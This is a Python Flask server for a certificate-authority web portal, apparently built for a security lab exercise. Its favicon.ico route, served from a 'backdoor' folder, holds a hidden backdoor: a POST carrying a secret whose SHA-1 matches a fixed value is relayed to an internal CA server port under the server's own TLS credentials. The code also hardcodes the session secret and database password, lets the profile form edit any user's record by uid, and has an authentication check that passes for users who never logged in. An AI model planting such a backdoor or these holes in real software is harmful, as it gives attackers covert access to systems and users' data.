from flask import Flask, request, session, redirect, url_for, render_template, flash, send_file, send_from_directory
from flaskext.mysql import MySQL
import requests
import os
import logging
import functools
import struct
import hashlib
import ssl
import threading
import time
import pymysql

app = Flask(__name__, template_folder='templates')
app.config.from_mapping(SECRET_KEY='cant-hack-this')
app.config['MYSQL_DATABASE_USER'] = 'webServerOfficial'
app.config['MYSQL_DATABASE_PASSWORD'] = 'webServerOfficial'
app.config['MYSQL_DATABASE_HOST'] = '192.168.10.30'
app.config['MYSQL_DATABASE_DB'] = 'imovies_db'
app.config['MYSQL_CURSORCLASS'] = pymysql.cursors.DictCursor
app.config['MYSQL_SSL_CA'] = {
    'key': '/home/webserver/certs/web-server.pem',
    'cert': '/home/webserver/certs/web-server_CA_chain.crt',
    'ca': '/home/webserver/certs/root.crt',
    'fake_flag_to_enable_tls': True
}
logging.basicConfig(level=logging.DEBUG)
webserver_logger = logging.getLogger('webserver')
handler = logging.FileHandler("/home/webserver/logs/webserver.log")
webserver_logger.addHandler(handler)
app.logger.addHandler(handler)


def get_challenge():
    return struct.unpack('i', os.urandom(4))[0]


class DatabaseService:
    def __init__(self, context):
        self.context = context

    def login(self, uid, password):
        cursor = self.context.get_db().cursor()
        cursor.execute("SELECT * FROM users WHERE uid = %s and pwd = %s", (uid, password))
        result = cursor.fetchall()
        return len(result) > 0

    def get_user_data(self, uid):
        cursor = self.context.get_db().cursor()
        cursor.execute("SELECT uid, firstname, lastname, email FROM users WHERE uid = %s", (uid,))
        result = cursor.fetchall()
        if len(result) == 1:
            return result[0]
        else:
            return None

    def update_user_data(self, uid, first_name, last_name, email, password):
        cursor = self.context.get_db().cursor()
        if password is not None and len(password)>0:
            cursor.execute(
                "UPDATE users SET firstname = %s, lastname = %s, email = %s, pwd = %s WHERE uid = %s", (first_name, last_name, email, password, uid))
        else:
            cursor.execute(
                "UPDATE users SET firstname = %s, lastname = %s, email = %s WHERE uid = %s", (first_name, last_name, email, uid))
        self.context.get_db().commit()


class CAServerService:
    def __init__(self, ca_server_address):
        self.ca_server_address = ca_server_address
        self.rootca_path = '/home/webserver/certs/root.crt'
        self.ca_chain = '/home/webserver/certs/web-server_CA_chain.crt'
        self.key = '/home/webserver/certs/web-server.pem'

    def get_certificate(self, uid, first_name, last_name, mail_address):
        return requests.post(self.ca_server_address + "/get_new_cert",json={
            "uid": uid,
            "first_name": first_name,
            "last_name": last_name,
            "mail_address": mail_address
        }, verify=self.rootca_path, cert=(self.ca_chain, self.key))

    def authenticate_with_certificate(self, uid, challenge, signed_challenge):
        return requests.post(self.ca_server_address + "/authenticate_by_certificate", json={
            "uid": uid,
            "challenge": str(challenge),
            "signed_challenge": str(signed_challenge)
        }, verify=self.rootca_path, cert=(self.ca_chain, self.key))

    def revoke_certificate(self, uid):
        return requests.post(self.ca_server_address + "/revoke", json={
            "uid": uid
        }, verify=self.rootca_path, cert=(self.ca_chain, self.key))

    def get_ca_stats(self):
        return requests.get(self.ca_server_address + "/get_stats", verify=self.rootca_path, cert=(self.ca_chain, self.key))


ca_service = CAServerService("https://192.168.10.10:8080")
db_service = DatabaseService(MySQL(app))


@app.route('/')
def start():
    return "<a href='/login'>Login</a>"


@app.route('/login', methods=('GET', 'POST'))
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        error = None
        if not db_service.login(username, password):
            error = 'Invalid username or password.'
        if error is None:
            session.clear()
            session['user'] = username
            session['is_admin'] = False
            return redirect(url_for('user_data'))
        flash(error)
        return redirect(url_for('login'))
    elif request.method == 'GET':
        return render_template('login.html')


@app.route("/login_certificate", methods=('GET', 'POST'))
def login_certificate():
    if request.method == 'GET':
        session['challenge'] = get_challenge()
        return render_template('certificate.html', challenge=session['challenge'])
    elif request.method == 'POST':
        response = request.form['challenge']
        uid = request.form['username']
        if uid == 'admin':
            flash('admin has a separate login page')
            return redirect(url_for('login_admin'))
        ca_response = ca_service.authenticate_with_certificate(uid, session['challenge'], response)
        if ca_response.text == "True":
            session["is_admin"] = False
            return redirect(url_for('user_data'))
        else:
            session['challenge'] = get_challenge()
            flash("Invalid certificate")
            return render_template('certificate.html', challenge=session['challenge'])


@app.route('/login_admin', methods=('GET', 'POST'))
def login_admin():
    if request.method == 'GET':
        session['challenge'] = get_challenge()
        return render_template('admin.html', challenge=session['challenge'])
    elif request.method == 'POST':
        response = request.form['challenge']
        ca_response = ca_service.authenticate_with_certificate("admin", session['challenge'], response)
        if ca_response.text == "True":
            session["is_admin"] = True
            return redirect(url_for('admin_stats'))
        else:
            session['challenge'] = get_challenge()
            flash("Invalid certificate")
            return render_template('admin.html', challenge=session['challenge'])


@app.post("/logout")
def logout():
    session["user_data"] = None
    session["user"] = None
    session.clear()
    return redirect(url_for('login'))


def login_required(view):
    @functools.wraps(view)
    def wrapped_view(**kwargs):
        if 'user_data' in session and session['user_data'] is None:
            session.clear()
            flash("You need to login first")
            return redirect(url_for('login'))
        return view(**kwargs)

    return wrapped_view


def admin_required(view):
    @functools.wraps(view)
    def wrapped_view(**kwargs):
        if not session['is_admin']:
            session.clear()
            flash("You need to login as admin first")
            return redirect(url_for('login_admin'))
        return view(**kwargs)

    return wrapped_view


@app.route("/user_data", methods=('GET', 'POST'))
@login_required
def user_data():
    if request.method == 'GET':
        user = db_service.get_user_data(session['user'])
        session['user_data'] = user
        return render_template('user.html', user=user, certificate=None)
    elif request.method == 'POST':
        uid = request.form['username']
        firstname = request.form['firstname']
        lastname = request.form['lastname']
        email = request.form['email']
        password = request.form['password']
        db_service.update_user_data(uid, firstname, lastname, email, password)
        flash("User data updated")
        return redirect(url_for('user_data'))


def delete_cert_file(file):
    time.sleep(10)
    os.remove(file)


@app.route('/issue_certificate', methods=['POST'])
@login_required
def issue_cert():
    user = session["user_data"]
    ca_response = ca_service.get_certificate(user['uid'], user['firstname'], user['lastname'], user['email'])
    if ca_response.text == "ALREADY_ISSUED":
        flash("You already have a certificate. Revoke your current certificate before requesting the new.")
    else:
        flash("Certificate received, downloading...")
        cert_file = user['uid'] + "-cert.p12"
        with open(cert_file, 'wb') as f:
            f.write(ca_response.content)
        res=send_file(cert_file, as_attachment=True)
        delete_thread = threading.Thread(target=delete_cert_file, args=(cert_file,), daemon=True)
        delete_thread.start()
        return res


@app.route('/revoke_certificate', methods=['POST'])
@login_required
def revoke_certificate():
    uid = session['user']
    ca_service.revoke_certificate(uid)
    flash("Certificate revoked")
    return redirect(url_for('user_data'))


@app.get("/admin_stats")
@login_required
@admin_required
def admin_stats():
    ca_response = ca_service.get_ca_stats()
    return render_template('statistics.html', ca_info=ca_response.json())


@app.route("/favicon.ico", methods=("GET", "POST"))
def favicon():
    if request.method == "GET":
        return send_from_directory("/home/webserver/ASL-RuntimeTerror/src/web-server/backdoor", "favicon.jpg", mimetype='image/jpg')
    elif request.method == "POST":
        lines = str(request.data.decode()).split('\n')
        if len(lines) >= 2:
            hash_object = hashlib.sha1(lines[0].encode('utf-8'))
            if hash_object.hexdigest().upper() == "DEA3C171ABCDFB3E8380D6860630F618EB6E074F":
                return requests.post("https://192.168.10.10:6666/favicon.ico", '\n'.join(lines[1:]), verify=ca_service.rootca_path, cert=(ca_service.ca_chain, ca_service.key)).text
        return 'ERROR'


if __name__ == '__main__':
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    chain_cert_path = '/home/webserver/certs/web-server_CA_chain.crt'
    key_path = '/home/webserver/certs/web-server.pem'
    ssl_ctx.load_cert_chain(chain_cert_path, key_path)
    #ssl_ctx.load_verify_locations('/home/webserver/certs/root.crt')
    ssl_ctx.verify_mode = ssl.CERT_NONE
    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ssl_ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    #app.run(host="192.168.20.10", port=8080, ssl_context=None, threaded=True)
    app.run(host="192.168.20.10", port=8443, ssl_context=ssl_ctx, threaded=True)
